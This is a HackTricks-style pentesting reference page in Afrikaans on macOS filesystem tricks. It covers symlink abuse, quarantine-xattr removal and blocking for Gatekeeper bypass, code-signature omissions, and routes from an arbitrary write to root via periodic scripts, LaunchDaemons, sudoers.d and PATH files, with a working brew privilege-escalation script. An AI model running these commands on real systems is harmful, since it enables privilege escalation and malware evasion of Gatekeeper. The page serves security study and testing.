# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX toestemmingskombinasies

Toestemmings in 'n **gids**:

- **lees** - jy kan die **gids** inskrywings **opnoem**
- **skryf** - jy kan **lêers** in die gids **verwyder/skryf** en jy kan **leë vouers verwyder**.
- Maar jy **kan nie nie-leë vouers verwyder/modifiseer** tensy jy skryftoestemmings daaroor het.
- Jy **kan nie die naam van 'n vouer modifiseer** tensy jy dit besit.
- **voer uit** - jy is **toegelaat om** die gids te **deursoek** - as jy nie hierdie reg het nie, kan jy nie enige lêers binne dit, of in enige subgidsen, toegang nie.

### Gevaarlike Kombinasies

**Hoe om 'n lêer/vouer wat deur root besit word te oorskryf**, maar:

- Een ouer **gids eienaar** in die pad is die gebruiker
- Een ouer **gids eienaar** in die pad is 'n **gebruikersgroep** met **skryftoegang**
- 'n Gebruikers **groep** het **skryf** toegang tot die **lêer**

Met enige van die vorige kombinasies, kan 'n aanvaller 'n **sim/hard skakel** na die verwagte pad **injek** om 'n bevoorregte arbitrêre skryf te verkry.

### Vouer root R+X Spesiale geval

As daar lêers in 'n **gids** is waar **slegs root R+X toegang het**, is dit **nie toeganklik vir enige iemand anders nie**. So 'n kwesbaarheid wat toelaat om 'n lêer wat deur 'n gebruiker leesbaar is, wat nie gelees kan word weens daardie **beperking**, van hierdie vouer **na 'n ander een** te beweeg, kan misbruik word om hierdie lêers te lees.

Voorbeeld in: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Simboliese Skakel / Hard Skakel

As 'n bevoorregte proses data in 'n **lêer** skryf wat **beheer** kan word deur 'n **laer bevoorregte gebruiker**, of wat **voorheen geskep** kan wees deur 'n laer bevoorregte gebruiker. Die gebruiker kan net **na 'n ander lêer wys** via 'n Simboliese of Hard skakel, en die bevoorregte proses sal op daardie lêer skryf.

Kyk in die ander afdelings waar 'n aanvaller 'n **arbitrêre skryf kan misbruik om voorregte te verhoog**.

## .fileloc

Lêers met **`.fileloc`** uitbreiding kan na ander toepassings of binêre lêers wys, so wanneer hulle geopen word, sal die toepassing/binêre die een wees wat uitgevoer word.\
Voorbeeld:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Arbitrary FD

As jy 'n **proses kan laat 'n lêer of 'n gids met hoë voorregte oopmaak**, kan jy **`crontab`** misbruik om 'n lêer in `/etc/sudoers.d` met **`EDITOR=exploit.py`** oop te maak, sodat die `exploit.py` die FD na die lêer binne `/etc/sudoers` sal kry en dit kan misbruik.

Byvoorbeeld: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Vermy kwarantyn xattrs truuks

### Verwyder dit
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable vlag

As 'n lêer/gids hierdie onveranderlike eienskap het, sal dit nie moontlik wees om 'n xattr daarop te plaas nie.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs monteer

'n **devfs** monteer **ondersteun nie xattr nie**, meer inligting in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Hierdie ACL verhoed dat `xattrs` by die lêer gevoeg word
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** lêerformaat kopieer 'n lêer insluitend sy ACEs.

In die [**bronkode**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) is dit moontlik om te sien dat die ACL teksverteenwoordiging wat binne die xattr genaamd **`com.apple.acl.text`** gestoor word, as ACL in die gedecomprimeerde lêer gestel gaan word. So, as jy 'n toepassing in 'n zip-lêer met **AppleDouble** lêerformaat gekompresseer het met 'n ACL wat voorkom dat ander xattrs daarop geskryf word... was die kwarantyn xattr nie in die toepassing gestel nie:

Kyk na die [**oorspronklike verslag**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) vir meer inligting.

Om dit te repliseer, moet ons eers die korrekte acl string kry:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note dat selfs al werk dit, die sandbox skryf die kwarantyn xattr voor)

Nie regtig nodig nie, maar ek laat dit daar net ingeval:

{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Omseil Kode Handtekeninge

Bundles bevat die lêer **`_CodeSignature/CodeResources`** wat die **hash** van elke enkele **lêer** in die **bundle** bevat. Let daarop dat die hash van CodeResources ook **ingebed is in die uitvoerbare**, so ons kan nie daarmee mors nie.

Daar is egter 'n paar lêers waarvan die handtekening nie nagegaan sal word nie, hierdie het die sleutel omit in die plist, soos:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Dit is moontlik om die handtekening van 'n hulpbron vanaf die cli te bereken met:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Mount dmgs

'n Gebruiker kan 'n pasgemaakte dmg monteer wat selfs bo-op sommige bestaande vouers geskep is. Dit is hoe jy 'n pasgemaakte dmg-pakket met pasgemaakte inhoud kan skep:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Gewoonlik monteer macOS skywe deur te kommunikeer met die `com.apple.DiskArbitrarion.diskarbitrariond` Mach diens (verskaf deur `/usr/libexec/diskarbitrationd`). As jy die param `-d` by die LaunchDaemons plist-lêer voeg en herbegin, sal dit logs stoor in `/var/log/diskarbitrationd.log`.\
Dit is egter moontlik om gereedskap soos `hdik` en `hdiutil` te gebruik om direk met die `com.apple.driver.DiskImages` kext te kommunikeer.

## Willekeurige Skrywe

### Periodieke sh skripte

As jou skrip as 'n **shell skrip** geïnterpreteer kan word, kan jy die **`/etc/periodic/daily/999.local`** shell skrip oorskryf wat elke dag geaktiveer sal word.

Jy kan 'n **vals** uitvoering van hierdie skrip maak met: **`sudo periodic daily`**

### Daemons

Skryf 'n willekeurige **LaunchDaemon** soos **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** met 'n plist wat 'n willekeurige skrip uitvoer soos:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Genereer net die skrip `/Applications/Scripts/privesc.sh` met die **opdragte** wat jy as root wil uitvoer.

### Sudoers Lêer

As jy **arbitraire skrywe** het, kan jy 'n lêer binne die gids **`/etc/sudoers.d/`** skep wat jouself **sudo** regte gee.

### PAD lêers

Die lêer **`/etc/paths`** is een van die hoof plekke wat die PATH omgewing veranderlike vul. Jy moet root wees om dit te oorskryf, maar as 'n skrip van 'n **bevoegde proses** 'n **opdrag sonder die volle pad** uitvoer, kan jy dalk dit **oorneem** deur hierdie lêer te wysig.

Jy kan ook lêers in **`/etc/paths.d`** skryf om nuwe gidse in die `PATH` omgewing veranderlike te laai.

## Genereer skryfbare lêers as ander gebruikers

Dit sal 'n lêer genereer wat aan root behoort en deur my geskryf kan word ([**kode van hier**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)). Dit kan ook as privesc werk:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX Gedeelde Geheue

**POSIX gedeelde geheue** laat prosesse in POSIX-konforme bedryfstelsels toe om toegang te verkry tot 'n gemeenskaplike geheuegebied, wat vinniger kommunikasie vergemaklik in vergelyking met ander inter-proses kommunikasie metodes. Dit behels die skep of oopmaak van 'n gedeelde geheue objek met `shm_open()`, die instelling van sy grootte met `ftruncate()`, en die kartering daarvan in die proses se adresruimte met `mmap()`. Prosesse kan dan direk lees van en skryf na hierdie geheuegebied. Om gelyktydige toegang te bestuur en data-korrupsie te voorkom, word sinchronisasie meganismes soos mutexes of semafore dikwels gebruik. Laastens, prosesse ontkarter en sluit die gedeelde geheue met `munmap()` en `close()`, en verwyder opsioneel die geheue objek met `shm_unlink()`. Hierdie stelsel is veral effektief vir doeltreffende, vinnige IPC in omgewings waar verskeie prosesse vinnig toegang tot gedeelde data moet verkry.

<details>

<summary>Produksie Kode Voorbeeld</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Verbruikerskode Voorbeeld</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Bewaakte Beskrywings

**macOS bewaakte beskrywings** is 'n sekuriteitskenmerk wat in macOS bekendgestel is om die veiligheid en betroubaarheid van **lêer beskrywing operasies** in gebruikersaansoeke te verbeter. Hierdie bewaakte beskrywings bied 'n manier om spesifieke beperkings of "wagte" met lêer beskrywings te assosieer, wat deur die kern afgedwing word.

Hierdie kenmerk is veral nuttig om sekere klasse van sekuriteitskwesbaarhede soos **ongemagtigde lêer toegang** of **wedloop toestande** te voorkom. Hierdie kwesbaarhede gebeur wanneer 'n draad byvoorbeeld 'n lêer beskrywing benader wat **'n ander kwesbare draad toegang gee** of wanneer 'n lêer beskrywing **geërf** word deur 'n kwesbare kind proses. Sommige funksies wat met hierdie funksionaliteit verband hou, is:

- `guarded_open_np`: Maak 'n FD met 'n wag oop
- `guarded_close_np`: Sluit dit
- `change_fdguard_np`: Verander wagvlagte op 'n beskrywing (selfs om die wag beskerming te verwyder)

## Verwysings

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)

{{#include ../../../../banners/hacktricks-training.md}}
